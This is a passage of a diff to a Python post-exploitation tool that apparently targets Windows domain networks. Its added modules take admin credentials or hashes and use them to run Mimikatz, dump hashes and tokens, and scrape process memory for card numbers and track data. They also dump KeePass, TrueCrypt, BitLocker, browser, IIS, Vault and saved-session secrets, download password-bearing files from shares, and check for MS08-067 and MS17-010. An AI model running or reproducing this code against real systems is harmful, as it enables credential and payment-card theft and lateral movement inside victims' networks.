+                    if [y,ip] not in tmpResultList1:
+                            tmpResultList1.append([y,ip])
+                for y in tmpResultList1:
+                    try:
+                        tmpStr=dict[y[0]]
+                        tmpStr+=", "+y[1]
+                        dict[y[0]]=tmpStr
+                    except KeyError:
+                        dict[y[0]]=y[1]    
+            tmpResultList2=[]      
+            tmpCount=1                                        
+            for key, value in dict.iteritems():
+                tmpResultList2.append([tmpCount,key,value])
+                tmpCount+=1
+
+            selectedOption=''    
+            selectedProcessList=[] 
+            selectedProcess=''        
+            while len(selectedOption)<1:
+                print tabulate(tmpResultList2)   
+                print "[*] Please enter a number or enter '*' to dump and search all processes:"        
+                selectedOption=raw_input()
+            selectedHostList=[]
+            for x in tmpResultList2:  
+                if str(selectedOption)==str(x[0]) or str(selectedOption)=="*":                
+                    selectedProcess=x[1]
+                    selectedProcessList.append(x[1])
+                    tmpSelectedHosts=x[2]
+                    if "," in tmpSelectedHosts:
+                        tmpList1=tmpSelectedHosts.split(",")
+                        for g in tmpList1:
+                            g=g.strip()
+                            if g not in selectedHostList:
+                                selectedHostList.append(g)
+                    else:
+                        if x[2] not in selectedHostList:
+                            selectedHostList.append(x[2])
+            if len(selectedHostList)>0:
+                for x in accessAdmHostList:
+                    ip=x[0]
+                    domain=x[1]
+                    username=x[2]
+                    password=x[3]
+                    if ip in selectedHostList:
+                        for selectedProcess in selectedProcessList:
+                            print "[*] Dumping Process '"+selectedProcess+"' on Host: "+ip   
+                            tmpResultList=memCredDump(ip,domain,username,password,passwordHash,selectedProcess)
+                            if "Access is denied" not in str(tmpResultList):
+                                for y in tmpResultList:
+                                    y=y.strip()
+                                    if len(y)>0:
+                                        if "CARD NUM:" in y:
+                                            y=y.split("CARD NUM:")[1]
+                                            y=y.strip()
+                                            if len(y):
+                                                if cardLuhnChecksumIsValid(y)==True:
+                                                    print y
+                                        if "TRACK DATA:" in y:                                        
+                                            y=y.split("TRACK DATA:")[1]
+                                            y=y.strip()
+                                            if len(y):
+                                                print y
+                            print setColor("[*]", bold, color="blue")+" "+ip+":445 | "+(setColor("[PAN][Memory] ", bold, color="green"))+" | No PAN Numbers found"
+            os._exit(1)
+
+
+    if args.module=='shares':
+        #python ms14_068.py 172.16.126.0/24 -d corp -u milo -p Password1 -M shares -o host=172.16.126.176
+        svrFilterList=[]
+        if args.module_options:
+            if "host=" in args.module_options[0]:
+                tmpip=(args.module_options[0]).replace("host=","")
+                svrFilterList.append(tmpip)
+        if len(accessAdmHostList)>0:
+            tmpBlackList=[]
+            tmpBlackList.append("Application Data")
+            tmpBlackList.append("Cookies")
+            tmpBlackList.append("Local Settings")
+            tmpBlackList.append("NetHood")
+            tmpBlackList.append("PrintHood")
+            tmpBlackList.append("Recent")
+            tmpBlackList.append("Start Menu")
+            tmpBlackList.append("Templates")
+            tmpBlackList.append("SendTo")
+            tmpBlackList.append("Videos")
+            tmpBlackList.append("Pictures")
+            tmpBlackList.append("Music")
+            tmpBlackList.append("Saved Games")
+            tmpBlackList.append("Searches")
+            tmpBlackList.append("Links")
+            tmpBlackList.append("Contacts")
+            tmpBlackList.append("ProgramData")
+            tmpBlackList.append("Program Files")
+            tmpBlackList.append("Program Files (x86)")
+            if args.module_options:
+                tmpFound=False
+                for x in accessAdmHostList:
+                    tmpip=x[0]
+                    if tmpip in svrFilterList:
+                        tmpFound=True
+                print (setColor("\nTesting Access to Shared Folders", bold, color="green"))            
+                if tmpFound==False:
+                    print "No suitable hosts found"
+            else:
+                print (setColor("\nTesting Access to Shared Folders", bold, color="green"))            
+
+            for x in accessAdmHostList:
+                ip=x[0]
+                domain=x[1]
+                username=x[2]
+                if len(x[3])==65 and x[3].count(":")==1:
+                    passwordHash=x[3]
+                    password=None
+                else:
+                    password=x[3]
+                    passwordHash=None
+                tmpPasswordList=runMimikatz(ip,domain,username,password,passwordHash)
+                for y in tmpPasswordList:
+                    accessAdmHostList.append(y)
+            for x in accessAdmHostList:            
+                print x
+
+            for x in accessAdmHostList:            
+                headers = ["IP", "Share/File","Status","Credentials"]
+                tmpip=x[0]
+                tmpdomain=x[1]
+                tmpusername=x[2]
+                tmppassword=x[3]
+                try:
+                    if len(svrFilterList)>0:
+                        if tmpip in svrFilterList:
+                            allowedList, deniedList=listRemoteShare(tmpip,tmpdomain, tmpusername, tmppassword)
+                    else:
+                        allowedList, deniedList=listRemoteShare(tmpip,tmpdomain, tmpusername, tmppassword)
+                    tmpOKList=[]
+                    tmpFailedList=[]
+                    tmpFailedList1=[]
+                    tmpUserPassList=[]
+                    credStr=tmpusername+"|"+tmppassword
+                    if len(allowedList)>0:
+                        for x in allowedList:
+                            tmpFound=False
+                            for g in tmpBlackList:
+                                if g.lower() in x[3].lower():
+                                    tmpFound=True
+                            if tmpFound==False:
+                                tmpOKList.append([x[0],str(x[3])[0:35],"[OK]",credStr])
+                    if len(deniedList)>0:
+                        for x in deniedList:   
+                            tmpFound=False
+                            for z in tmpBlackList:
+                                if z in x[3]:
+                                    tmpFound=True
+                            if tmpFound==False:
+                                tmpFailedList.append([x[0],str(x[3])[0:35],(setColor("[NOK]", bold, color="red"))])
+                    tmpFailedList1=tmpFailedList
+                    if [tmpip,tmpdomain,tmpusername,tmppassword] not in userPassList:
+                        userPassList.append([tmpip,tmpdomain,tmpusername,tmppassword])
+                    for z in userPassList:
+                        for y in tmpFailedList:
+                            tmpIP=y[0]
+                            filePath=y[1]
+                            tmpdomain=(z[1]).lower()
+                            tmpusername=(z[2]).lower()
+                            tmppassword=z[3]
+                            if accessRemoteShare(tmpIP,filePath,tmpdomain, tmpusername, tmppassword)==True:
+                                tmpFailedList1.remove([tmpIP,filePath,(setColor("[NOK]", bold, color="red"))])
+                                tmpOKList.append([tmpIP,filePath,'[OK]',tmpusername+"|"+tmppassword])
+                except Exception as e:
+                    print e
+                    continue
+                tmpFailedList=tmpFailedList1
+                tmpFinalList=[]
+                for x in tmpOKList:
+                    tmpFinalList.append([x[0],x[1],x[2],x[3]])
+                for x in tmpFailedList:
+                    tmpFinalList.append([x[0],x[1],x[2],''])
+                print tabulate(tmpFinalList)
+
+    if args.module=='reg':
+        #print (setColor("\nFind Interesting Registry Keys", bold, color="green"))
+        tmpResultList=[]
+        for x in accessAdmHostList:
+            ip=x[0]
+            domain=x[1]
+            username=x[2]
+            if len(x[3])==65 and x[3].count(":")==1:
+                passwordHash=x[3]
+                password=None
+            else:
+                password=x[3]
+                passwordHash=None
+            results=findInterestingRegKeys(ip,domain,username,password,passwordHash)
+            for y in results:    
+                if y not in tmpResultList:     
                     tmpResultList.append(y)
-    if len(tmpResultList)>0:
-        print tabulate(tmpResultList,tablefmt="simple")
+        if len(tmpResultList)>0:
+            for x in tmpResultList:
+                targetIP=x[0]
+                #tmpDomain="domain"
+                #tmpUsername="milo"
+                #tmpPassword="Password1"
+                tmpRegPath=x[1]
+                tmpCred=x[2]
+                print (setColor("[+]", bold, color="green"))+" "+targetIP+":445"+" | "+domain+"\\"+username+":"+password+" | "+(setColor("[reg] ", color="green"))+"| "+tmpRegPath+" | "+tmpCred
+                #(setColor(" | "+tmpRegPath, bold, color="green"))                
 
-    print (setColor("\nIIS Credentials", bold, color="green"))
-    tmpResultList=[]
-    tmpDoneList=[]
-    for x in accessAdmHostList:
-        if x[0] not in tmpDoneList:
+            #headers = ["Host","Reg Path", "Password/Hash"]
+            #print tabulate(tmpResultList,headers)
+        os._exit(0)
+
+    if args.module=='route':
+        if len(accessAdmHostList)>0:
+            print (setColor("\n[*] Finding Network Routes", bold, color="green"))
+            dict={}        
+            for x in accessAdmHostList:
+                ip=x[0]
+                domain=x[1]
+                username=x[2]
+                password=x[3]
+                if len(x[3])==65 and x[3].count(":")==1:
+                    passwordHash=x[3]
+                    password=None
+                else:
+                    password=x[3]
+                    passwordHash=None
+                findRoute(ip,domain,username,password,passwordHash)
+        os._exit(0)
+
+    if args.module=='keepass':
+        #print (setColor("\nDumping Keepass Passwords", bold, color="green"))
+        tmpResultList=[]
+        tmpDoneList=[]
+        for x in accessAdmHostList:
+            if x[0] not in tmpDoneList:
+                ip=x[0]
+                domain=x[1]
+                username=x[2]
+                if len(x[3])==65 and x[3].count(":")==1:
+                    passwordHash=x[3]
+                    password=None
+                else:
+                    password=x[3]
+                    passwordHash=None
+                results=getKeepass(ip,domain,username,password,passwordHash)
+                for y in results:
+                    if len(y)>0:
+                        y=y.strip()
+                        if [ip,y] not in tmpResultList:
+                            tmpResultList.append([ip,y])
+                tmpDoneList.append(x[0])
+
+        if len(tmpResultList)>0:
+            #print (setColor("\n[+]", bold, color="green"))+" List of Keepass databases and passwords found"                
+            for x in tmpResultList:
+                targetIP=x[0]
+                print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" | "+(setColor("[keepass] ", bold, color="green"))+"| "+x[1]
+        #else:
+        #    print "No results found"
+        os._exit(1)
+
+    if args.module=="vuln":
+        from modules import ms08_067
+        from modules import ms17_010
+        ms08_067List=[]
+        for ip in dcList:
+            tmpResultList=ms08_067.check(ip)
+            if len(tmpResultList)>0:
+                for x in tmpResultList:
+                    tmpIP=x[0]
+                    tmpStatus=x[1]
+                    if tmpStatus=='VULNERABLE':
+                        if tmpIP not in ms08_067List:
+                            ms08_067List.append(tmpIP)
+                        #print (setColor("[+]", bold, color="green"))+" "+tmpIP+":445 | "+(setColor("[MS08-067]", color="green"))
+            result=ms17_010.check(ip)
+            if 'is likely VULNERABLE ' in str(result):
+                result=result.replace('[+] [','')
+                result=result.replace('(','')
+                result=result.replace(')','')
+                if ip not in ms08_067List:
+                    result=result.replace('] is likely VULNERABLE to MS17-010!',':445 | '+(setColor("[MS17-010]", color="green")))
+                else:
+                    result=result.replace('] is likely VULNERABLE to MS17-010!',':445 | '+(setColor("[MS08-067][MS17-010]", color="green")))                
+                print (setColor("[+] ", bold, color="green"))+result
+        for ip in nbList:
+            tmpResultList=ms08_067.check(ip)
+            if len(tmpResultList)>0:
+                for x in tmpResultList:
+                    tmpIP=x[0]
+                    tmpStatus=x[1]
+                    if tmpStatus=='VULNERABLE':
+                        if tmpIP not in ms08_067List:
+                            ms08_067List.append(tmpIP)
+                        #print (setColor("[+]", bold, color="green"))+" "+tmpIP+":445 | "+(setColor("[MS08-067]", color="green"))
+            result=ms17_010.check(ip)
+            if 'is likely VULNERABLE ' in str(result):
+                result=result.replace('[+] [','')
+                result=result.replace('(','')
+                result=result.replace(')','')
+                if ip not in ms08_067List:
+                    result=result.replace('] is likely VULNERABLE to MS17-010!',':445 | '+(setColor("[MS17-010]", color="green")))
+                else:
+                    result=result.replace('] is likely VULNERABLE to MS17-010!',':445 | '+(setColor("[MS08-067][MS17-010]", color="green")))                
+                print (setColor("[+] ", bold, color="green"))+result
+        os._exit(1)
+
+    if args.module=='mimikatz':
+        tmpResultList=[]
+        tmpDoneList=[]
+        for x in accessAdmHostList:
+            if x[0] not in tmpDoneList:
+                ip=x[0]
+                domain=x[1]
+                username=x[2]
+                if len(x[3])==65 and x[3].count(":")==1:
+                    passwordHash=x[3]
+                    password=None
+                else:
+                    password=x[3]
+                    passwordHash=None
+                runMimikatz(ip,domain,username,password,passwordHash)
+        os._exit(1)
+
+    if args.module=='hashes':
+        tmpResultList=[]
+        tmpDoneList=[]
+        for x in accessAdmHostList:
+            if x[0] not in tmpDoneList:
+                ip=x[0]
+                domain=x[1]
+                username=x[2]
+                if len(x[3])==65 and x[3].count(":")==1:
+                    passwordHash=x[3]
+                    password=None
+                else:
+                    password=x[3]
+                    passwordHash=None
+                runHashes(ip,domain,username,password,passwordHash)
+        os._exit(1)
+
+    if args.module=='tokens':
+        tmpResultList=[]
+        for x in accessAdmHostList:
             ip=x[0]
             domain=x[1]
             username=x[2]
@@ -5734,20 +6046,13 @@ if args.module=="passwords":
             else:
                 password=x[3]
                 passwordHash=None
-            results=dumpIIS(ip,domain,username,password,passwordHash)
-            for y in results:
-                tmpResultList.append(y)
-        tmpDoneList.append(x[0])
-    if len(tmpResultList)>0:
-        print tabulate(tmpResultList,tablefmt="simple")
-    #else:
-    #    print "No results found"
+                tokensPriv(ip,domain,username,password,passwordHash)
+        os._exit(1)
 
-    print setColor('\nWindows Vault Credentials', bold, color='green')
-    tmpResultList=[]
-    tmpDoneList=[]
-    for x in accessAdmHostList:
-        if x[0] not in tmpDoneList:
+    if args.module=="bitlocker":
+        print (setColor("\nDumping Bitlocker Recovery Keys", bold, color="green"))
+        tmpResultList=[]
+        for x in accessAdmHostList:
             ip=x[0]
             domain=x[1]
             username=x[2]
@@ -5757,34 +6062,310 @@ if args.module=="passwords":
             else:
                 password=x[3]
                 passwordHash=None
-            results=runDumpVault(ip,domain,username,password,passwordHash)
+            results=getBitlockerKeys(ip,domain,username,password,passwordHash)
             for y in results:
-                tmpResultList.append(y)
-        tmpDoneList.append(x[0])
-    if len(tmpResultList)>0:
-        print tabulate(tmpResultList,tablefmt="simple")
-    else:
-        print "No results found"
+                y=y.strip()
+                if len(y)>0:
+                    tmpResultList.append([ip,y])
+        if len(tmpResultList)>0:
+            headers = ["IP","Bitlocker Keys"]
+            print tabulate(tmpResultList,headers,tablefmt="simple")
+        os._exit(1)
 
-if args.module=="apps":
-    print (setColor("\nList of Installed Programs", bold, color="green"))
-    tmpResultList=[]
-    for x in accessAdmHostList:
-        tmpip=x[0]
-        tmpdomain=x[1]
-        tmpusername=x[2]
-        if len(x[3])==65 and x[3].count(":")==1:
-            tmppasswordHash=x[3]
-            tmppassword=None
+    if args.module=='truecrypt':
+        print (setColor("\nDecrypting Truecrypt", bold, color="green"))
+        tmpResultList=[]
+        tmpDoneList=[]
+        for x in accessAdmHostList:
+            if x[0] not in tmpDoneList: 
+                print "[*] Targeting Host: "+x[0]
+                tmpDoneList.append(x[0])
+                ip=x[0]
+                domain=x[1]
+                username=x[2]
+                if len(x[3])==65 and x[3].count(":")==1:
+                    passwordHash=x[3]
+                    password=None
+                else:
+                    password=x[3]
+                    passwordHash=None
+                getTruecrypt(ip,domain,username,password,passwordHash)
+        os._exit(1)
+
+    if args.module=="passwords":
+        print (setColor("\nDumping PuTTY, WinSCP, Remote Desktop saved sessions, Filezilla, SuperPuTTY", bold, color="green"))
+        tmpResultList=[]
+        for x in accessAdmHostList:
+            ip=x[0]
+            domain=x[1]
+            username=x[2]
+            if len(x[3])==65 and x[3].count(":")==1:
+                passwordHash=x[3]
+                password=None
+            else:
+                password=x[3]
+                passwordHash=None
+            results=sessionGopher(ip,domain,username,password,passwordHash)
+            #for y in results:
+            #    if len(y)>0:
+            #        tmpResultList.append(y)
+        #if len(tmpResultList)>0:
+        #    print tabulate(tmpResultList,tablefmt="simple")
+        #else:
+        #    print "No results found"
+
+        print (setColor("\nFind Interesting Registry Keys", bold, color="green"))
+        tmpResultList=[]
+        for x in accessAdmHostList:
+            ip=x[0]
+            domain=x[1]
+            username=x[2]
+            if len(x[3])==65 and x[3].count(":")==1:
+                passwordHash=x[3]
+                password=None
+            else:
+                password=x[3]
+                passwordHash=None
+            results=findInterestingRegKeys(ip,domain,username,password,passwordHash)
+            for y in results:    
+                if y not in tmpResultList:     
+                    tmpResultList.append(y)
+        if len(tmpResultList)>0:
+            headers = ["Host","Reg Path", "Password/Hash"]
+            print tabulate(tmpResultList,headers)
+
+        print (setColor("\nFind Interesting Files", bold, color="green"))
+        tmpDoneList=[]
+        if len(accessAdmHostList)>0:
+            for x in accessAdmHostList:
+                if x[0] not in tmpDoneList:
+                    ip=x[0]
+                    domain=x[1]
+                    username=x[2]
+                    if len(x[3])==65 and x[3].count(":")==1:
+                        passwordHash=x[3]
+                        password=None
+                    else:
+                        password=x[3]
+                        passwordHash=None
+                    tmpFileList=findInterestingFiles(ip,domain,username,password,passwordHash)
+                    if len(tmpFileList)>0:
+                        print (setColor("[+]", bold, color="green"))+" Downloading the files from host: "+ip
+                        count=0
+                        for filename in tmpFileList:           
+                            filename=filename.strip()
+                            tmpFilename=(downloadFile(ip,domain,username,password,filename))
+                            if len(tmpFilename)>0:
+                                if count>0:
+                                    print (setColor("\n[+]", bold, color="green"))+" "+ip+":445 "+getNetBiosName(ip)+" | "+filename+" | "+tmpFilename
+
+                                else:
+                                    print (setColor("[+]", bold, color="green"))+" "+ip+":445 "+getNetBiosName(ip)+" | "+filename+" | "+tmpFilename
+                                if "unattend.xml" in filename.lower() or "sysprep.xml" in filename.lower():
+                                    tmpResultList=parseUnattendXML(tmpFilename)
+                                    if len(tmpResultList)>0:
+                                        headers = ["Username","Password"]
+                                        print tabulate(tmpResultList,headers,tablefmt="simple")
+                                        print "\n"
+                                if "ultravnc.ini" in filename.lower():
+                                    tmpResultList=parseUltraVNC(tmpFilename)
+                                    for x in tmpResultList:
+                                        print "Password1: "+x[0]
+                                        print "Password2: "+x[1]
+                                if "sitemanager.xml" in filename.lower():
+                                    tmpResultList=parseSiteManagerXML(tmpFilename)
+                                    headers = ["Host", "Username","Password"]
+                                    print tabulate(tmpResultList,headers,tablefmt="simple")                    
+                                if ".txt" in filename.lower():
+                                    with open(tmpFilename) as f:
+                                        lines = f.read().splitlines()
+                                        count1=0
+                                        if len(lines)<10:
+                                            for x in lines:
+                                                x=x.strip()
+                                                if count1<10:
+                                                    print x
+                                            count1+=1
+                                count+=1
+                tmpDoneList.append(x[0])
+
+
+        print (setColor("\nDumping Bitlocker Recovery Keys", bold, color="green"))
+        tmpResultList=[]
+        for x in accessAdmHostList:
+            ip=x[0]
+            domain=x[1]
+            username=x[2]
+            if len(x[3])==65 and x[3].count(":")==1:
+                passwordHash=x[3]
+                password=None
+            else:
+                password=x[3]
+                passwordHash=None
+            results=getBitlockerKeys(ip,domain,username,password,passwordHash)
+            for y in results:
+                y=y.strip()
+                if len(y)>0:
+                    tmpResultList.append([ip,y])
+        if len(tmpResultList)>0:
+            headers = ["IP","Bitlocker Keys"]
+            print tabulate(tmpResultList,headers,tablefmt="simple")
+        #else:
+        #    print "No results found"
+
+        print (setColor("\nDumping Keepass Passwords", bold, color="green"))
+        tmpResultList=[]
+        for x in accessAdmHostList:
+            ip=x[0]
+            domain=x[1]
+            username=x[2]
+            if len(x[3])==65 and x[3].count(":")==1:
+                passwordHash=x[3]
+                password=None
+            else:
+                password=x[3]
+                passwordHash=None
+            results=getKeepass(ip,domain,username,password,passwordHash)
+            for y in results:
+                if len(y)>0:
+                    y=y.strip()
+                    if [ip,y] not in tmpResultList:
+                        tmpResultList.append([ip,y])
+        if len(tmpResultList)>0:
+            print (setColor("\n[+]", bold, color="green"))+" List of Keepass databases and passwords found"                
+            for x in tmpResultList:
+                print x[0]+"\t"+x[1]
         else:
-            tmppassword=x[3]
-            tmppasswordHash=None
-        tmpAppList=getInstalledPrograms(tmpip,tmpdomain,tmpusername,tmppassword,tmppasswordHash)        
-        for y in tmpAppList:
-            tmpResultList.append(y)
-    if len(tmpResultList)>0:
-        headers = ["Host","Software", "Version"]
-        print tabulate(tmpResultList,headers,tablefmt="simple")
-cleanUp()
-os._exit(0)
+            print "No results found"
+
+
+        print (setColor("\nDumping Truecrypt Master Keys", bold, color="green"))
+        tmpResultList=[]
+        tmpDoneList=[]
+        for x in accessAdmHostList:
+            if x[0] not in tmpDoneList:
+                ip=x[0]
+                domain=x[1]
+                username=x[2]
+                if len(x[3])==65 and x[3].count(":")==1:
+                    passwordHash=x[3]
+                    password=None
+                else:
+                    password=x[3]
+                    passwordHash=None
+                results=getTruecrypt(ip,domain,username,password,passwordHash)
+                tmpDoneList.append(x[0])
+
+        print (setColor("\nDumping Browser Passwords", bold, color="green"))
+        tmpResultList=[]
+        for x in accessAdmHostList:
+            tmpip=x[0]
+            tmpdomain=x[1]
+            tmpusername=x[2]
+            if len(x[3])==65 and x[3].count(":")==1:
+                tmppasswordHash=x[3]
+                tmppassword=None
+            else:
+                tmppassword=x[3]
+                tmppasswordHash=None
+            results=dumpBrowser(tmpip,tmpdomain,tmpusername,tmppassword,tmppasswordHash)
+            if len(results)>0:
+                for y in results:
+                    if y not in tmpResultList:
+                        tmpResultList.append(y)
+        if len(tmpResultList)>0:
+            print tabulate(tmpResultList,tablefmt="simple")
+
+        print (setColor("\nIIS Credentials", bold, color="green"))
+        tmpResultList=[]
+        tmpDoneList=[]
+        for x in accessAdmHostList:
+            if x[0] not in tmpDoneList:
+                ip=x[0]
+                domain=x[1]
+                username=x[2]
+                if len(x[3])==65 and x[3].count(":")==1:
+                    passwordHash=x[3]
+                    password=None
+                else:
+                    password=x[3]
+                    passwordHash=None
+                results=dumpIIS(ip,domain,username,password,passwordHash)
+                for y in results:
+                    tmpResultList.append(y)
+            tmpDoneList.append(x[0])
+        if len(tmpResultList)>0:
+            print tabulate(tmpResultList,tablefmt="simple")
+        #else:
+        #    print "No results found"
+
+        print setColor('\nWindows Vault Credentials', bold, color='green')
+        tmpResultList=[]
+        tmpDoneList=[]
+        for x in accessAdmHostList:
+            if x[0] not in tmpDoneList:
+                ip=x[0]
+                domain=x[1]
+                username=x[2]
+                if len(x[3])==65 and x[3].count(":")==1:
+                    passwordHash=x[3]
+                    password=None
+                else:
+                    password=x[3]
+                    passwordHash=None
+                results=runDumpVault(ip,domain,username,password,passwordHash)
+                for y in results:
+                    tmpResultList.append(y)
+            tmpDoneList.append(x[0])
+        if len(tmpResultList)>0:
+            print tabulate(tmpResultList,tablefmt="simple")
+        else:
+            print "No results found"
+
+    if args.module=="browser":
+        print (setColor("\nDumping Browser Passwords", bold, color="green"))
+        tmpResultList=[]
+        for x in accessAdmHostList:
+            tmpip=x[0]
+            tmpdomain=x[1]
+            tmpusername=x[2]
+            if len(x[3])==65 and x[3].count(":")==1:
+                tmppasswordHash=x[3]
+                tmppassword=None
+            else:
+                tmppassword=x[3]
+                tmppasswordHash=None
+            results=dumpBrowser(tmpip,tmpdomain,tmpusername,tmppassword,tmppasswordHash)
+            if len(results)>0:
+                for y in results:
+                    if y not in tmpResultList:
+                        tmpResultList.append(y)
+        if len(tmpResultList)>0:
+            print tabulate(tmpResultList,tablefmt="simple")
+        os._exit(1)
+
+    if args.module=="apps":
+        print (setColor("\nList of Installed Programs", bold, color="green"))
+        tmpResultList=[]
+        for x in accessAdmHostList:
+            tmpip=x[0]
+            tmpdomain=x[1]
+            tmpusername=x[2]
+            if len(x[3])==65 and x[3].count(":")==1:
+                tmppasswordHash=x[3]
+                tmppassword=None
+            else:
+                tmppassword=x[3]
+                tmppasswordHash=None
+            tmpAppList=getInstalledPrograms(tmpip,tmpdomain,tmpusername,tmppassword,tmppasswordHash)        
+            for y in tmpAppList:
+                tmpResultList.append(y)
+        if len(tmpResultList)>0:
+            headers = ["Host","Software", "Version"]
+            print tabulate(tmpResultList,headers,tablefmt="simple")
+    cleanUp()
+    os._exit(0)
+except (KeyboardInterrupt, SystemExit):
+    cmd = 'pkill -f portia'
+    os.system(cmd)
 
